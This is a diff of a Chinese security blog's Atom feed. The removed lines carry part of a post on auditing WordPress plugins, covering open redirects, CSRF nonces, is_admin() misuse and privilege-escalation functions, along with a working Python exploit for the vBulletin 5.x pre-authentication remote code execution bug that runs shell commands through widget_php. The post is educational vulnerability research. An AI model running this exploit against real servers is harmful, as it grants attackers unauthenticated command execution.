-  &lt;li&gt;preg_replace() dangerous “e” flag deprecated since PHP &amp;gt;= 5.5.0 and removed in PHP &amp;gt;= 7.0.0.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;任意url跳转&quot;&gt;任意url跳转&lt;/h3&gt;
-
-&lt;p&gt;系统自带的跳转函数，本身没做检查，需要插件作者自行做过滤，否则会存在任意url跳转的风险。&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wp_redirect()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;csrf利用nonce&quot;&gt;CSRF（利用nonce）&lt;/h3&gt;
-
-&lt;p&gt;在wordpress中，主要用自带的nonce作为token来防治csrf，当然也有过插件作者自造token的。&lt;/p&gt;
-
-&lt;p&gt;另外值得一提的是，wordpress的评论机制似乎对csrf没有防御。&lt;/p&gt;
-
-&lt;p&gt;在nonce检查中，不是每一步都检查权限的。实际代码跨越了多个文件和函数调用，因此这个过程很容易出现这种缺陷，示例见：
-&lt;a href=&quot;https://xz.aliyun.com/t/3659&quot;&gt;WordPress权限提升漏洞分析
-&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;下面是对csrf攻击的防御：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;wp_nonce_field() csrf token加入表单&lt;/li&gt;
-  &lt;li&gt;wp_nonce_url() csrf token加入url&lt;/li&gt;
-  &lt;li&gt;wp_verify_nonce() 服务端需要验证csrf token&lt;/li&gt;
-  &lt;li&gt;check_admin_referer() server端检查是否来自admin权限页面【笔者觉得比较鸡肋】&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;另外，有人提过nonce可以抑制SSRF的产生。&lt;/p&gt;
-
-&lt;h3 id=&quot;wordpress权限认证绕过&quot;&gt;wordpress权限认证绕过&lt;/h3&gt;
-
-&lt;p&gt;由于WordPress中的AJAX动作是通过wp-admin/admin-ajax.php文件访问的，所以is_admin()总是返回true。&lt;/p&gt;
-
-&lt;p&gt;官方说法：&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Whether the current request is for an administrative interface page. […] Does not check if the user is an administrator; current_user_can() for checking roles and capabilities.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;可用攻击向量&quot;&gt;可用攻击向量&lt;/h3&gt;
-
-&lt;p&gt;下面的函数本来是无害的，它们一般会用于构造利用链，做wordpress权限提升。如果没有过滤完全，会比单纯输出打印内容更富有威胁性。&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;update_option() 输入未严格验证的时候，可能会触发wordpress的option的更新。&lt;/li&gt;
-  &lt;li&gt;do_action() 输入未严格验证的时候，会触发wordpress代码执行。&lt;/li&gt;
-  &lt;li&gt;add_action 触发函数钩子。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;第三方信任源和自带后门&quot;&gt;第三方信任源和自带后门&lt;/h3&gt;
-
-&lt;p&gt;第三方信任源的问题，主要可能是对第三方网站内容的加载，没有进行合适过滤。&lt;/p&gt;
-
-&lt;p&gt;而插件自带后门，可能会存在硬编码，或者缺少权限验证/权限混乱的问题。通过审计代码，黑客可以直接获取网站权限。比如最近vBulletin 5.x的rce【这里没有现成的wp插件举例，大家将就下】：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;lt;URL to vBulletin&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;routestring&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ajax/render/widget_php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-     &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-          &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;vBulletin$ &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-          &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;widgetConfig[code]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;echo shell_exec('&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;'); exit;&quot;&lt;/span&gt;
-          &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-               &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
-          &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-               &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Exploit failed! :(&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-     &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;KeyboardInterrupt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-          &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Closing shell...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-     &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-          &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;从poc来看，这里的利用方式是不需要认证的，直接通过post参数组，传入恶意代码，即可执行命令。
-对于这个后门是否为官方故意所为，笔者不好下定论，但这种漏洞确实不少见。
-早些年笔者挖掘cve时就曾遇到过，那还是个有几十万用户量的wordpress插件。&lt;/p&gt;
-
-&lt;h3 id=&quot;后记&quot;&gt;后记&lt;/h3&gt;
-
-&lt;p&gt;对于cve漏洞挖掘，还是需要耐心和细心的。毕竟流程复杂的漏洞不好挖，简单的漏洞大部分被人挖过了，尤其是被人怼了个通透的大型开源CMS。&lt;/p&gt;
-
-&lt;p&gt;一般白盒和黑盒挖掘需要结合，Fuzz和审计都是有用的。&lt;/p&gt;
-
-&lt;p&gt;通过分析语法树，以及动态hook的法子，也越来越被推广使用。&lt;/p&gt;
-
-&lt;p&gt;举例说，如果尝试梳理长语法树和调用链，无论是注重深度还是注重广度，一般都需要较高内存机器去跑，说实话耗费资源是不低的。&lt;/p&gt;
-
-&lt;p&gt;而一旦这块儿做好了以后，就算我们不一定能主动发现新漏洞。但除了漏洞公告后，我们通过调用链回溯diff出来的点，一般我们都能很快地去定位到可用的漏洞利用链，说不定还有意外惊喜。&lt;/p&gt;
-
-&lt;h3 id=&quot;文章参考&quot;&gt;文章参考&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/WordPress/WordPress-Coding-Standards&quot;&gt;wordpress编码标准&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.fortinet.com/blog/threat-research/wordpress-plugin-sql-injection-vulnerability.html&quot;&gt;Multiple WordPress Plugins SQL Injection Vulnerabilities&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/4438&quot;&gt;评论处wp_filter_post_kses过滤不全&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/6395&quot;&gt;渲染导致的HTML实体编码失效&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2643&quot;&gt;使用grep检查wp-sec&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/1482&quot;&gt;$wpdb-&amp;gt;prepare的修复和正确使用&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2150&quot;&gt;PHP反序列化与Wordpress一些意外Bug的有趣结合&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/ethicalhack3r/wordpress_plugin_security_testing_cheat_sheet&quot;&gt;wordpress插件安全文档&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>HellSec</name></author><category term="vuln" /><summary type="html">一般出名点的开源软件，比如wordpress的核心高危漏洞是比较难挖的。但其附属的高用户量的插件漏洞也是具有一定的价值的，而挖掘起来相对容易些，这里就来简单谈谈wordpress插件漏洞的挖掘和修复。</summary></entry></feed>
+&lt;p&gt;另外，这里不建议优先采用公共dns平台，因为即使是使用了api交互，公共dns平台也一般会有延时的风险，更别提可能被GA监控管制，再者说证明截图啥的，也需要时间的。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">在实现漏洞扫描的时候，部分开发者会使用payload直接进行fuzz，而且并没有对server端的拦截和过滤，有相对智能的反馈，这对扫描效率和成功率是影响比较大的。</summary></entry></feed>
